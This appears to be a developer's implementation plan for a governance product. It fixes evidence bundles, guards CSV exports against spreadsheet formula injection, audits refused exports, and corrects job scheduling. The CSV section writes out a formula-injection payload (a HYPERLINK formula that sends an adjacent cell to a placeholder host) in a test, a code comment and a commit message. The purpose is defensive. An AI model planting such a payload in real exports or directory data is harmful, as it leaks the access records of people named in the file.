    // engagement the system can honestly produce.
    expect(bundle.decisions[0]).toMatchObject({ decision: 'certify', neverOpened: false });
  });

  it('names a campaign bundle’s own campaign, and a report bundle’s absence of one', async () => {
    const { bundle } = await createEvidencePack(tenantId, actorUserId, {
      kind: 'report',
      snapshotId,
      scope: { systemId: 'sys-1' },
    });
    expect(bundle.campaignId).toBeNull();
    expect(bundle.items).toEqual([]);
    // NOT silently empty. A report bundle legitimately has no campaign, and the
    // cover has to distinguish that from a campaign bundle that lost its
    // contents -- which is the state every bundle used to be in.
    expect(bundle.limitations.join(' ')).toMatch(/no campaign/i);
  });

  /**
   * §17: the digest exists so "a reader can recompute it a year later". It
   * could not: nothing recorded where the bytes were, `storageRef` was never
   * written, and re-creating the pack produced a different document because the
   * chain head had moved.
   */
  it('can be fetched again and recomputes to the same digest', async () => {
    const seeded = await seedDecidedCampaign();
    const created = await createEvidencePack(tenantId, actorUserId, {
      kind: 'campaign',
      snapshotId,
      campaignId: seeded.campaignId,
      scope: { campaignId: seeded.campaignId },
    });

    const row = await withTenant(tenantId, (tx) =>
      tx.evidencePack.findUniqueOrThrow({ where: { id: created.id } }),
    );
    expect(row.storageRef).toBe(`/api/admin/govern/evidence/${created.id}`);

    // More audit events happen. The bundle must not change: it is built from
    // the range the PACK recorded, not from the chain as it stands today.
    await withTenant(tenantId, (tx) =>
      recordEvent(tx, {
        actorUserId,
        action: 'govern.report.export',
        targetType: 'AccessSnapshot',
        targetId: snapshotId,
        outcome: 'success',
        sourceIp: null,
        payload: {},
      }),
    );

    const fetched = await fetchEvidencePack(tenantId, created.id);
    expect(fetched.digestMatches).toBe(true);
    expect(fetched.bundle.digest).toBe(created.digest);
  });
```

Write `seedDecidedCampaign()` beside the file's existing `beforeEach`: a campaign, two `CampaignItem` rows (one `certified`, one `undecided`), one `CampaignItemReviewer`, one `CampaignDecision` on the certified item, and one `RevocationBatch` with one `RevocationDispatch`. Read the models in `packages/db/prisma/schema.prisma` for required columns before writing it, and add `fetchEvidencePack` to the file's import.

- [ ] **Step 2: Run the test to verify it fails**

Run: `npx vitest run packages/core/src/govern/export-service.test.ts -t 'items, decisions'`

Expected: FAIL — `bundle.items` is `[]` and `fetchEvidencePack` does not exist.

- [ ] **Step 3: Give the bundle real element shapes**

In `packages/core/src/govern/export-service.ts`, replace the `EvidenceBundle` interface:

```ts
/**
 * The document §17 describes, and the thing it used not to be.
 *
 * Every one of `items`, `decisions`, `reviewers`, `notifications` and
 * `dispatches` was hard-coded `[]`, and the digest was computed over that -- so
 * the bundle VERIFIED, while its own cover made a claim about items it did not
 * contain. An auditor received a signed, digest-checked artifact with zero
 * decisions in it and nothing saying so.
 *
 * The element shapes are written out rather than left as `unknown[]` because
 * this document is the product: an auditor reads these field names, and
 * `unknown` is how a field quietly stops being written.
 */
export interface EvidenceBundle {
  header: ReportHeader;
  limitations: string[];
  /** Null for a report or period bundle, which legitimately covers no campaign. */
  campaignId: string | null;
  snapshot: unknown;
  coverage: unknown;
  items: {
    id: string;
    subjectKey: string;
    systemId: string;
    resourceKind: string;
    resourceId: string;
    resourceName: string;
    status: string;
    statusReason: string | null;
    coverageStatus: string;
    riskFlags: string[];
    observedAt: string;
    holdingSnapshotId: string;
    attributions: unknown;
  }[];
  decisions: {
    id: string;
    itemId: string;
    personId: string;
    decision: string;
    comment: string | null;
    decidedAt: string;
    itemOpenedAt: string;
    /** §17's engagement signals, offered as signals rather than as proof. */
    neverOpened: boolean;
    viaBulk: boolean;
    bulkSize: number | null;
    sessionDecisionOrdinal: number;
    coverageAtDecision: unknown;
  }[];
  reviewers: {
    itemId: string;
    personId: string;
    via: string;
    assignedAt: string;
    unassignedAt: string | null;
    unassignedReason: string | null;
  }[];
  notifications: { template: string; to: string; createdAt: string; sentAt: string | null }[];
  /**
   * Stated on the bundle when the notification set is approximate. See
   * `buildEvidenceBundle`.
   */
  notificationLimitation: string | null;
  dispatches: {
    itemId: string | null;
    route: string;
    status: string;
    message: string | null;
    sequence: number;
    dispatchedAt: string | null;
    confirmedAt: string | null;
    appliedAt: string | null;
  }[];
  chain: {
    fromSequence: number;
    toSequence: number;
    result: string;
    headSequence: number;
    headHash: string;
  };
  digest: string;
}
```

- [ ] **Step 4: Add the two cover statements the empty bundle needed and never had**

Append to `BUNDLE_LIMITATIONS`:

```ts
  'Where this bundle covers no campaign, it contains no items and no decisions, and says so on this line rather than by being empty. A campaign bundle with an empty item list is a defect, not a clean review.',
  'The notification set is matched by template and by time window, because Syntra does not record which campaign an outbox row belonged to. It may include a notification from another campaign running in the same period, and it is offered as a record of what was sent rather than as a complete set.',
```

- [ ] **Step 5: Split the build out of the create, and read what the pack names**

Replace `createEvidencePack` with the pair below. The spec type is what makes the digest reproducible: everything the document depends on is recorded on the row, so a rebuild a year later reads the same inputs.

```ts
/**
 * Everything the bundle is built from, all of it recorded on the
 * `EvidencePack` row.
 *
 * §17: the digest exists so "a reader can recompute it a year later". It could
 * not, because the document was built from the chain AS IT STOOD -- so
 * re-creating a pack produced a different document with a different digest, and
 * `storageRef` was never written, so there was no other copy either.
 *
 * Building from the recorded range instead makes the bundle a pure function of
 * the row, which is a stronger artifact than filed bytes: it can be recomputed
 * AND checked against the digest that was stored at the time.
 */
export interface EvidenceSpec {
  snapshotId: string;
  campaignId: string | null;
  scope: Record<string, unknown>;
  chainFromSequence: number;
  chainSeedHash: string;
  chainHeadSequence: number;
  chainHeadHash: string;
}

export async function buildEvidenceBundle(
  tenantId: string,
  spec: EvidenceSpec,
): Promise<Omit<EvidenceBundle, 'digest'>> {
  const loaded = await withTenant(tenantId, async (tx) => {
    const snapshot = await readableSnapshot(tx, spec.snapshotId);
    const sources = await tx.snapshotSource.findMany({ where: { snapshotId: snapshot.id } });
    const gaps = await tx.coverageGap.findMany({ where: { snapshotId: snapshot.id } });
    return { snapshot, sources, gaps };
  });

  const segment = await verifySegment(tenantId, spec.chainFromSequence, spec.chainSeedHash);

  // ---- the campaign's own record ------------------------------------------
  //
  // ONE transaction of reads, and every one of them bounded by the campaign
  // rather than by the tenant. A 50,000-item campaign's bundle is a large
  // document by construction and that is correct -- it is the record somebody
  // signs against -- but it must not be assembled by a query per item.
  const campaign =
    spec.campaignId === null
      ? null
      : await withTenant(tenantId, async (tx) => {
          const row = await tx.campaign.findUniqueOrThrow({ where: { id: spec.campaignId! } });
          const items = await tx.campaignItem.findMany({
            where: { campaignId: spec.campaignId! },
            orderBy: { id: 'asc' },
          });
          const decisions = await tx.campaignDecision.findMany({
            where: { item: { campaignId: spec.campaignId! } },
            orderBy: [{ decidedAt: 'asc' }, { id: 'asc' }],
          });
          const reviewers = await tx.campaignItemReviewer.findMany({
            where: { item: { campaignId: spec.campaignId! } },
            orderBy: { id: 'asc' },
          });
          const dispatches = await tx.revocationDispatch.findMany({
            where: { batch: { campaignId: spec.campaignId! } },
            orderBy: [{ batchId: 'asc' }, { sequence: 'asc' }],
          });
          // MATCHED BY TEMPLATE AND WINDOW, because `NotificationOutbox` has no
          // campaign column -- it carries `requestId` for Automate and nothing
          // for Govern. Approximate, and the bundle says so on its cover rather
          // than presenting a partial set as a complete one.
          const notifications = await tx.notificationOutbox.findMany({
            where: {
              template: { startsWith: 'govern-review-' },
              createdAt: { gte: row.createdAt, lte: row.dueAt },
            },
            orderBy: { createdAt: 'asc' },
          });
          return { items, decisions, reviewers, dispatches, notifications };
        });

  const header: ReportHeader = {
    snapshotId: loaded.snapshot.id,
    asOf: loaded.snapshot.asOf.toISOString(),
    live: false,
    sources: loaded.sources.map((s) => ({
      sourceKind: s.sourceKind,
      sourceId: s.sourceId,
      sourceName: s.sourceName,
      lastSuccessfulReadAt: s.lastSuccessfulReadAt?.toISOString() ?? null,
      completeness: s.completeness,
      staleness: s.staleness,
      ageHours:
        s.lastSuccessfulReadAt === null
          ? null
          : (loaded.snapshot.asOf.getTime() - s.lastSuccessfulReadAt.getTime()) / 3_600_000,
      gapCount: s.gapCount,
    })),
    coverageGapCount: loaded.snapshot.coverageGapCount,
    unattributableCount: loaded.snapshot.unattributableCount,
    unattributedAccountCount: loaded.snapshot.unattributedAccountCount,
    scopeDescription: JSON.stringify(spec.scope),
  };

  return {
    header,
    // Printed on the COVER of every bundle, not kept in a caveats appendix,
    // because the harm this module causes is somebody over-reading its output.
    limitations: [...BUNDLE_LIMITATIONS],
    campaignId: spec.campaignId,
    snapshot: {
      id: loaded.snapshot.id,
      asOf: loaded.snapshot.asOf.toISOString(),
      holdingCount: loaded.snapshot.holdingCount,
      unattributableCount: loaded.snapshot.unattributableCount,
    },
    coverage: loaded.gaps.map((g) => ({ kind: g.kind, reason: g.reason, systemId: g.systemId })),
    items: (campaign?.items ?? []).map((i) => ({
      id: i.id,
      subjectKey: i.subjectKey,
      systemId: i.systemId,
      resourceKind: i.resourceKind,
      resourceId: i.resourceId,
      resourceName: i.resourceName,
      status: i.status,
      statusReason: i.statusReason,
      coverageStatus: i.coverageStatus,
      riskFlags: i.riskFlags,
      observedAt: i.observedAt.toISOString(),
      holdingSnapshotId: i.holdingSnapshotId,
      attributions: i.attributions,
    })),
    decisions: (campaign?.decisions ?? []).map((d) => ({
      id: d.id,
      itemId: d.itemId,
      personId: d.personId,
      decision: d.decision,
      comment: d.comment,
      decidedAt: d.decidedAt.toISOString(),
      itemOpenedAt: d.itemOpenedAt.toISOString(),
      neverOpened: d.neverOpened,
      viaBulk: d.viaBulk,
      bulkSize: d.bulkSize,
      sessionDecisionOrdinal: d.sessionDecisionOrdinal,
      coverageAtDecision: d.coverageAtDecision,
    })),
    reviewers: (campaign?.reviewers ?? []).map((r) => ({
      itemId: r.itemId,
      personId: r.personId,
      via: r.via,
      assignedAt: r.assignedAt.toISOString(),
      unassignedAt: r.unassignedAt?.toISOString() ?? null,
      unassignedReason: r.unassignedReason,
    })),
    notifications: (campaign?.notifications ?? []).map((n) => ({
      template: n.template,
      to: n.to,
      createdAt: n.createdAt.toISOString(),
      sentAt: n.sentAt?.toISOString() ?? null,
    })),
    notificationLimitation:
      campaign === null
        ? null
        : 'matched by template and by the campaign’s own window, because no column records which campaign an outbox row belonged to',
    dispatches: (campaign?.dispatches ?? []).map((d) => ({
      itemId: d.itemId,
      route: d.route,
      status: d.status,
      message: d.message,
      sequence: d.sequence,
      dispatchedAt: d.dispatchedAt?.toISOString() ?? null,
      confirmedAt: d.confirmedAt?.toISOString() ?? null,
      appliedAt: d.appliedAt?.toISOString() ?? null,
    })),
    chain: {
      fromSequence: segment.fromSequence,
      toSequence: segment.toSequence,
      result: segment.result,
      headSequence: spec.chainHeadSequence,
      headHash: spec.chainHeadHash,
    },
  };
}

export async function createEvidencePack(
  tenantId: string,
  actorUserId: string,
  input: {
    kind: 'campaign' | 'report' | 'period';
    snapshotId?: string | undefined;
    campaignId?: string | undefined;
    scope: Record<string, unknown>;
  },
): Promise<{ id: string; digest: string; bundle: EvidenceBundle }> {
  const anchor = await withTenant(tenantId, async (tx) => {
    const snapshot = await readableSnapshot(tx, input.snapshotId);
    const status = await integrityStatus(tx, false);
    const lastCheckpoint = await tx.auditCheckpoint.findFirst({ orderBy: { sequence: 'desc' } });
    return { snapshotId: snapshot.id, status, lastCheckpoint };
  });

  const spec: EvidenceSpec = {
    snapshotId: anchor.snapshotId,
    campaignId: input.campaignId ?? null,
    scope: input.scope,
    chainFromSequence: (anchor.lastCheckpoint?.sequence ?? 0) + 1,
    chainSeedHash: anchor.lastCheckpoint?.hash ?? GENESIS_HASH,
    chainHeadSequence: anchor.status.headSequence,
    chainHeadHash: anchor.status.headHash,
  };

  const withoutDigest = await buildEvidenceBundle(tenantId, spec);
  const digest = bundleDigest(withoutDigest);
  const bundle: EvidenceBundle = { ...withoutDigest, digest };
  const body = JSON.stringify(bundle);

  const id = await withTenant(tenantId, async (tx) => {
    const pack = await tx.evidencePack.create({
      data: {
        tenantId,
        kind: input.kind,
        scope: input.scope as never,
        snapshotId: spec.snapshotId,
        campaignId: spec.campaignId,
        chainHeadSequence: spec.chainHeadSequence,
        chainHeadHash: spec.chainHeadHash,
        chainVerificationResult: bundle.chain.result,
        chainFromSequence: bundle.chain.fromSequence,
        chainToSequence: bundle.chain.toSequence,
        digest,
        byteLength: Buffer.byteLength(body, 'utf8'),
        createdByUserId: actorUserId,
      },
    });
    // `storageRef` STOPS BEING A LIE. The column's own comment says it is
    // "where the bytes live", and it was never written -- so a bundle could not
    // be fetched again, and re-creating one produced a different document
    // because the chain head had moved. It names the route that rebuilds this
    // pack from its own recorded range.
    await tx.evidencePack.update({
      where: { id: pack.id },
      data: { storageRef: `/api/admin/govern/evidence/${pack.id}` },
    });
    await recordEvent(tx, {
      actorUserId,
      action: 'govern.evidence.create',
      targetType: 'EvidencePack',
      targetId: pack.id,
      outcome: 'success',
      sourceIp: null,
      payload: {
        kind: input.kind,
        digest,
        chainResult: bundle.chain.result,
        scope: input.scope,
        itemCount: bundle.items.length,
        decisionCount: bundle.decisions.length,
      },
    });
    return pack.id;
  });

  return { id, digest, bundle };
}

/**
 * Rebuilds a pack from its own recorded range and says whether the result still
 * digests to what was stored.
 *
 * `digestMatches: false` is not an error to swallow. It means the document a
 * pack describes is no longer the document that was signed -- which is either a
 * pruned snapshot, an edited campaign, or the thing §17 says hash chaining
 * exists to detect -- and the caller has to be able to say so on the screen.
 */
export async function fetchEvidencePack(
  tenantId: string,
  packId: string,
): Promise<{ bundle: EvidenceBundle; digestMatches: boolean }> {
  const pack = await withTenant(tenantId, (tx) =>
    tx.evidencePack.findUniqueOrThrow({ where: { id: packId } }),
  );
  if (pack.snapshotId === null) {
    throw new Error('this evidence pack names no snapshot, so it cannot be rebuilt');
  }

  const withoutDigest = await buildEvidenceBundle(tenantId, {
    snapshotId: pack.snapshotId,
    campaignId: pack.campaignId,
    scope: pack.scope as Record<string, unknown>,
    chainFromSequence: pack.chainFromSequence,
    // The seed is the checkpoint hash the original walk started from. It is not
    // stored, and it does not need to be: `chainFromSequence` is 1 exactly when
    // the walk began at genesis, and otherwise the checkpoint at
    // `chainFromSequence - 1` is the one it seeded on.
    chainSeedHash: await seedHashFor(tenantId, pack.chainFromSequence),
    chainHeadSequence: pack.chainHeadSequence,
    chainHeadHash: pack.chainHeadHash,
  });

  const bundle: EvidenceBundle = { ...withoutDigest, digest: bundleDigest(withoutDigest) };
  return { bundle, digestMatches: bundle.digest === pack.digest };
}

async function seedHashFor(tenantId: string, fromSequence: number): Promise<string> {
  if (fromSequence <= 1) return GENESIS_HASH;
  const checkpoint = await withTenant(tenantId, (tx) =>
    tx.auditCheckpoint.findFirst({
      where: { sequence: fromSequence - 1 },
      orderBy: { verifiedAt: 'desc' },
    }),
  );
  return checkpoint?.hash ?? GENESIS_HASH;
}
```

- [ ] **Step 6: Add the route that `storageRef` names**

In `apps/api/src/routes/admin/govern.ts`, beside the existing evidence route:

```ts
  app.get(
    '/govern/evidence/:id',
    // `govern.export` as well as `govern.read`: this returns the whole signed
    // document, which is the same act as creating one. "Reading a screen and
    // walking out with a file are different acts with different consequences,
    // and only one of them is a copy."
    { preHandler: requireGovernRead(PERMISSIONS.GOVERN_EXPORT) },
    async (request) => {
      const { id } = idParam.parse(request.params);
      const { bundle, digestMatches } = await fetchEvidencePack(request.tenantId, id);
      // Returned, never thrown. A bundle that no longer digests to what was
      // stored is the most interesting thing this route can say, and a 500
      // would say it as "something went wrong".
      return { bundle, digestMatches };
    },
  );
```

Add `fetchEvidencePack` to the `@syntra/core` import list, and add the route to `GOVERN_READ_ROUTES`:

```ts
  {
    path: 'GET /govern/evidence/:id',
    scoped: false,
    why: 'a bundle is a signed artifact over a campaign or a snapshot as a whole; it cannot be partially disclosed and is gated on govern.export instead',
  },
```

- [ ] **Step 7: Run the tests to verify they pass**

```bash
npx vitest run packages/core/src/govern/export-service.test.ts
npx vitest run apps/api/src/routes/admin/govern.test.ts
```

Expected: PASS, including the pre-existing "carries its limitations on its cover, in words" and the digest-stability case.

- [ ] **Step 8: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add packages/core/src/govern/export-service.ts \
        packages/core/src/govern/export-service.test.ts \
        apps/api/src/routes/admin/govern.ts
git commit -m "$(cat <<'MSG'
fix(govern): an evidence bundle that contains evidence

createEvidencePack took a campaignId, stored it on the row, and never read
it. Items, decisions, reviewers, notifications and dispatches were
hard-coded empty arrays, and the digest was computed over that -- so the
bundle VERIFIED PERFECTLY, while its own printed cover asserted that "an
item marked undecided in this bundle was NOT attested", a statement about
items the bundle does not contain. An auditor received a signed,
digest-checked artifact with zero decisions in it and nothing saying so.
That is section 1's harm in its most direct form: a report that looks
complete, is not, and is signed anyway.

The document now carries the campaign's items, decisions, reviewers,
dispatches and notifications, with written-out element shapes rather than
unknown[] -- an auditor reads these field names, and unknown is how a
field quietly stops being written. Notifications are matched by template
and window because NotificationOutbox has no campaign column, and the
cover says so rather than presenting an approximate set as a complete one.
A report bundle legitimately has no campaign, and the cover distinguishes
that from a campaign bundle that lost its contents.

storageRef stops being a lie. Section 17 says the digest exists so a
reader can recompute it a year later, and they could not: the bundle was
built from the chain as it stood, so re-creating a pack produced a
different document, and nothing recorded where the bytes were. The bundle
is now a pure function of the pack row -- every input is recorded on it --
and storageRef names the route that rebuilds it. That route returns
digestMatches rather than throwing: a bundle that no longer digests to
what was stored is the most interesting thing it can say.
MSG
)"
```

---

### Task 11: A CSV cell cannot execute, and a refused export leaves a trace

Spec §6.2 — **G19** (CSV export has no formula-injection guard) and **G25** (refused exports are not audited). Both in `export-service.ts`, and both about the same artifact.

**G19.** `escape` quotes only on `"`, `\n` and `,`. A cell beginning `=`, `+`, `-`, `@`, tab or carriage return is written verbatim — and quoting would not neutralise it anyway, because a spreadsheet strips the quotes before deciding whether the value is a formula. **Every value in this export originates in directory or target data, which a *target* administrator controls and a Syntra one does not.** A group named `=HYPERLINK("http://x/?"&A2,"click")` executes when an auditor opens the export, exfiltrating the row beside it. The regex also omits `\r`, so a lone carriage return splits a row and every subsequent field lands under the wrong header.

**G25.** `exportReportCsv` throws on a live report *before* any `recordEvent`, while the successful path is audited. §10: "the audit log should be able to answer who took a copy of it" — and repeated refused attempts, which are what an attempt to walk out with everybody's access looks like when it does not work the first time, leave no trace at all.

**Files:**
- Modify: `packages/core/src/govern/export-service.ts:23-51` (`toCsv` and `escape`) and `:53-99` (`exportReportCsv`)
- Test: `packages/core/src/govern/export-service.test.ts`

**Interfaces:**
- Consumes: `withTenant` from `@syntra/db`; `recordEvent` from `../audit/audit-service.js`; `headerOf`, `bodyOf`, `type ReportEnvelope`, `type ReportHeader`, `type SystemAccessRow` from `./report-service.js`.
- Produces:
  - `export function csvCell(value: string): string` — the single-cell escape, exported so the test can be a table of values rather than a search through a rendered document.
  - `toCsv(header, rows)` and `exportReportCsv(tenantId, actorUserId, envelope, scope)` keep their signatures.

- [ ] **Step 1: Write the failing test**

Add to `packages/core/src/govern/export-service.test.ts`:

```ts
/**
 * EVERY VALUE IN THIS EXPORT ORIGINATES IN DIRECTORY OR TARGET DATA.
 *
 * That is what makes this a real attack rather than a lint rule: the person who
 * names an Active Directory group is a TARGET administrator, not a Syntra one,
 * and Govern's entire job is to inventory systems Syntra does not control. A
 * group named `=HYPERLINK("http://x/?"&A2,"click")` executes the moment an
 * auditor opens the export, and the cell beside it is somebody's access.
 *
 * Quoting does not help: a spreadsheet strips the quotes before deciding
 * whether the value is a formula. The value has to stop being one.
 */
describe('csvCell', () => {
  it('neutralises every leading character a spreadsheet treats as a formula', () => {
    for (const dangerous of ['=', '+', '-', '@', '\t', '\r']) {
      const cell = csvCell(`${dangerous}HYPERLINK("http://x/?"&A2,"click")`);
      // Prefixed, so the first character is no longer the formula introducer,
      // and quoted so the prefix survives the parse.
      expect(cell.startsWith(`"'${dangerous}`)).toBe(true);
    }
  });

  it('leaves an ordinary value exactly as it was', () => {
    // The export is read by people. Quoting or prefixing every cell would make
    // the common case unreadable to defend against the rare one.
    expect(csvCell('Ward Nurses')).toBe('Ward Nurses');
    expect(csvCell('')).toBe('');
    // A minus inside a value is not a leading minus.
    expect(csvCell('Finance-Payments')).toBe('Finance-Payments');
  });

  it('still quotes and doubles the characters CSV itself needs escaped', () => {
    expect(csvCell('Novak, Anna "A"')).toBe('"Novak, Anna ""A"""');
  });

  it('quotes a CARRIAGE RETURN, which used to split the row', () => {
    // The regex tested `\n` and not `\r`, so a lone CR ended the record and
    // every field after it landed under the wrong header -- silently, in a
    // document whose whole purpose is that somebody can read it a year later.
    expect(csvCell('Ward\rNurses')).toBe('"Ward\rNurses"');
  });
});

it('audits a REFUSED export as well as a successful one', async () => {
  // §10: "the audit log should be able to answer who took a copy of it." A
  // refusal is part of that answer. Repeated refused attempts are what an
  // attempt to walk out with everybody's access looks like when it does not
  // work the first time, and they left no trace at all.
  const live = envelope(
    {
      live: true as const,
      computedAt: NOW.toISOString(),
      exportable: false as const,
      caveat: 'live',
    },
    { rows: [], holderCount: { known: true, value: 0 } },
  );

  await expect(
    exportReportCsv(tenantId, actorUserId, live, { systemId: 'sys-1' }),
  ).rejects.toThrow(/no as-of time/);

  const event = await withTenant(tenantId, (tx) =>
    tx.auditEvent.findFirstOrThrow({ where: { action: 'govern.report.export' } }),
  );
  expect(event.outcome).toBe('failure');
  expect(event.actorUserId).toBe(actorUserId);
  expect(event.payload).toMatchObject({ format: 'csv', scope: { systemId: 'sys-1' } });
});
```

Add `csvCell` to the file's import.

- [ ] **Step 2: Run the test to verify it fails**

Run: `npx vitest run packages/core/src/govern/export-service.test.ts -t 'csvCell'`

Expected: FAIL — `csvCell` does not exist; and the refusal case finds no audit event.

- [ ] **Step 3: Write the cell escape**

In `packages/core/src/govern/export-service.ts`, above `toCsv`:

```ts
/**
 * The characters a spreadsheet treats as the start of a formula.
 *
 * `\t` and `\r` are on the list because Excel and LibreOffice both skip leading
 * whitespace before looking at the first meaningful character, so a cell that
 * begins with a tab and then `=` is a formula.
 */
const FORMULA_INTRODUCERS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * One CSV cell, escaped so it cannot execute and cannot break the record.
 *
 * EVERY VALUE IN THIS EXPORT ORIGINATES IN DIRECTORY OR TARGET DATA, and that
 * is what makes the formula case a real attack rather than a lint rule: the
 * person who names an Active Directory group is a TARGET administrator, not a
 * Syntra one, and inventorying systems Syntra does not control is this module's
 * entire job. A group named `=HYPERLINK("http://x/?"&A2,"click")` executes the
 * moment an auditor opens the export, and the cell beside it is somebody's
 * access.
 *
 * QUOTING IS NOT THE DEFENCE. A spreadsheet strips the quotes before deciding
 * whether the value is a formula, so the previous form -- quote on `"`, `\n`
 * and `,` -- would not have neutralised one even if it had matched. The value
 * has to stop being a formula, which means a leading apostrophe: the
 * convention every spreadsheet reads as "this is text", and which is stripped
 * on display.
 *
 * `\r` is in the quoting test now as well. It was not, so a lone carriage
 * return ended the record and every field after it landed under the wrong
 * header -- silently, in a document whose whole purpose is that somebody can
 * read it a year later.
 *
 * An ordinary value is returned untouched. Quoting or prefixing every cell
 * would make the common case unreadable to defend against the rare one, and an
 * export nobody can read is an export nobody checks.
 */
export function csvCell(value: string): string {
  const dangerous = FORMULA_INTRODUCERS.includes(value.slice(0, 1));
  const body = dangerous ? `'${value}` : value;
  return /["\n\r,]/.test(body) || dangerous ? `"${body.replace(/"/g, '""')}"` : body;
}
```

and replace the local `const escape = ...` in `toCsv` with `const escape = csvCell;` — or use `csvCell` directly at both call sites and delete the local. Keep one name in the function body so the two rendering paths cannot diverge.

- [ ] **Step 4: Audit the refusal**

In `exportReportCsv`, replace the `if (header.live) { throw ... }` block:

```ts
  const header = headerOf(e);
  if (header.live) {
    // AUDITED BEFORE IT THROWS. §10: "the audit log should be able to answer
    // who took a copy of it" -- and a refusal is part of that answer. The
    // successful path was audited and this one was not, so repeated refused
    // attempts left no trace, which is exactly what an attempt to walk out with
    // everybody's access looks like when it does not work the first time.
    //
    // Its OWN transaction, committed before the throw, for the reason the
    // decision path learned the hard way: `withTenant` is
    // `prisma.$transaction(fn)`, so a throw inside the transaction that wrote
    // the row takes the row with it and the trail records nothing.
    await withTenant(tenantId, (tx) =>
      recordEvent(tx, {
        actorUserId,
        action: 'govern.report.export',
        targetType: 'AccessSnapshot',
        targetId: null,
        outcome: 'failure',
        sourceIp: null,
        payload: {
          format: 'csv',
          scope,
          reason: 'live_report',
          statement:
            'a live report has no as-of time, and evidence with no as-of time is not evidence',
        },
      }),
    );
    throw new Error(
      'a live report cannot be exported as evidence: it has no as-of time, and evidence with no as-of time is not evidence',
    );
  }
```

- [ ] **Step 5: Run the test to verify it passes**

Run: `npx vitest run packages/core/src/govern/export-service.test.ts`

Expected: PASS. The pre-existing "escapes a value containing a comma or a quote" case asserts `'"Novak, Anna ""A"""'` and still holds — the escape is unchanged for values that do not begin with an introducer.

- [ ] **Step 6: Run the route that calls it**

Run: `npx vitest run apps/api/src/routes/admin/govern.test.ts`

Expected: PASS. `POST /govern/exports/csv` is the only caller.

- [ ] **Step 7: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add packages/core/src/govern/export-service.ts \
        packages/core/src/govern/export-service.test.ts
git commit -m "$(cat <<'MSG'
fix(govern): a CSV cell that cannot execute, and a refusal that leaves a trace

Every value in the CSV export originates in directory or target data, and
that is what makes formula injection a real attack here rather than a lint
rule: the person who names an Active Directory group is a TARGET
administrator, not a Syntra one, and inventorying systems Syntra does not
control is this module's entire job. A group named
=HYPERLINK("http://x/?"&A2,"click") executes the moment an auditor opens
the export, and the cell beside it is somebody's access.

The escape quoted on ", newline and comma only, and quoting is not the
defence anyway -- a spreadsheet strips the quotes before deciding whether
the value is a formula. A leading =, +, -, @, tab or CR is now prefixed
with an apostrophe, the convention every spreadsheet reads as "this is
text". Ordinary values are untouched: quoting every cell to defend against
the rare one makes an export nobody reads.

The same regex omitted \r, so a lone carriage return ended the record and
every field after it landed under the wrong header, silently, in a
document whose whole purpose is being readable a year later.

And a refused export is audited now, in its own committed transaction
before the throw. Section 10 says the audit log should answer who took a
copy; a refusal is part of that answer, and repeated refused attempts are
what walking out with everybody's access looks like when it does not work
the first time.
MSG
)"
```

---

### Task 12: Pausing snapshots stops snapshots, and "Verify now" verifies

Spec §6.2 — **G20** (clearing the snapshot cadence unschedules six unrelated jobs), **G21** ("Verify now" raises a false critical alarm and downgrades the checkpoint), and the `verifyFull` half of **G26** (exported, tested, reachable from nothing).

**G20.** `applyGovernSchedules` treats `snapshotSchedule === null` as "unschedule every purpose". Pausing snapshots — a documented operation, and the obvious thing to do while a directory migration runs — also stops `govern.audit.verify`, so a broken hash chain is never detected; `govern.exception.sweep`, so an approved exception stays `active` past its `endsAt` **forever** and its violation stays `excepted`, invisible on the default `open` filter; and campaign close and reminders, so every open campaign silently stops asking. Exception expiry is enforced *only* by the sweep this switch turns off.

**G21.** `POST /govern/integrity/verify` calls `verifyIncremental(tenantId)` with no options, so `signer` defaults to `null` while the scheduler passes a real one built from `GOVERN_CHECKPOINT_KEY`. `checkpointTrust` then returns `unknown_key` for a legitimately signed checkpoint, the result is forced to `broken`, a `critical` `audit_chain_broken` finding is raised and mailed, a full genesis walk runs inside the HTTP request — and the recovery branch writes a new head checkpoint **unsigned**, so that night's scheduled run refuses to seed on it and walks from genesis again. Pressing the button makes the integrity story worse, permanently, until somebody presses it again.

**Files:**
- Create: `apps/api/src/govern-signer.ts`
- Modify: `packages/core/src/govern/jobs.ts:308-340` (`applyGovernSchedules`)
- Modify: `apps/api/src/scheduler.ts:252-268` (use the shared helper)
- Modify: `apps/api/src/routes/admin/govern.ts:242-245` (options), `:598-603` (the verify route), and add the full-verify route
- Modify: `apps/api/src/app.ts:276-282` (pass the signer)
- Test: `packages/core/src/govern/jobs.test.ts` (the existing "UNSCHEDULES every purpose" case), `apps/api/src/routes/admin/govern.test.ts`

**Interfaces:**
- Consumes: `localFileCheckpointSigner(keyId: string, key: Buffer) => CheckpointSigner` and `type CheckpointSigner` from `@syntra/core`; `type Config` from `@syntra/core`; `verifyFull(tenantId, options?: { pageSize?: number }) => Promise<SegmentResult>`; `verifyIncremental(tenantId, options?: { now?: Date; pageSize?: number; signer?: CheckpointSigner | null })`.
- Produces:
  - `apps/api/src/govern-signer.ts`: `export function configuredCheckpointSigner(config: Config): CheckpointSigner | null`.
  - `applyGovernSchedules(scheduler, tenantId, snapshotSchedule)` — same signature; a `null` cadence now unschedules the `snapshot` purpose only.
  - `registerAdminGovernRoutes(app, options)` — options gains `checkpointSigner?: () => CheckpointSigner | null`.
  - `POST /api/admin/govern/integrity/verify-full` — `govern.manage`, no body, returns a `SegmentResult`.

- [ ] **Step 1: Write the failing schedule test**

In `packages/core/src/govern/jobs.test.ts`, **replace** `it('UNSCHEDULES every purpose when the cadence is cleared', ...)` with:

```ts
  it('unschedules ONLY the snapshot purpose when the cadence is cleared', async () => {
    // Pausing snapshots is a documented operation -- the obvious thing to do
    // while a directory migration runs -- and it used to switch off six
    // unrelated controls with it.
    //
    // `govern.audit.verify`, so a broken hash chain is never detected.
    // `govern.exception.sweep`, so an approved SoD exception stays `active`
    // past its `endsAt` FOREVER and its violation stays `excepted`, invisible
    // on the default `open` filter -- and §15's expiry is enforced by nothing
    // else. Campaign close and reminders, so every open campaign silently stops
    // asking and never reaches its due date.
    const { scheduler, scheduled, unscheduled } = fakeScheduler();
    await applyGovernSchedules(scheduler, tenantId, null);

    expect(unscheduled).toHaveLength(1);
    expect(unscheduled[0]!.name).toBe(GOVERN_SNAPSHOT_JOB);
    expect(unscheduled[0]!.key).toBe(governScheduleKey(tenantId, 'snapshot'));
    // Every other purpose is still scheduled, on its own key.
    expect(scheduled).toHaveLength(GOVERN_PURPOSES.length - 1);
